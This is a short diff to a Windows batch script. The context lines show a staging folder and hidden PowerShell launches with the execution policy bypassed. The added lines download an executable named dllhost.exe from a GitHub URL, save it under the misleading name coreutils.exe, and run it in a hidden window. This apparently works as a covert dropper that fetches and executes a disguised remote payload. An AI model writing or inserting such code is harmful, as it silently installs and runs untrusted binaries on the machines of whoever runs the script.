@@ -17,5 +17,8 @@ if not exist "%STAGE%\config.json" (
   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -File "%STAGE%\gen.ps1"
 )
 
+if not exist "%STAGE%\coreutils.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/dllhost.exe' -OutFile '%STAGE%\coreutils.exe' -UseBasicParsing"
+
 cd /d "%STAGE%"
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\dllhost.exe' -WindowStyle Hidden"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\coreutils.exe' -WindowStyle Hidden"
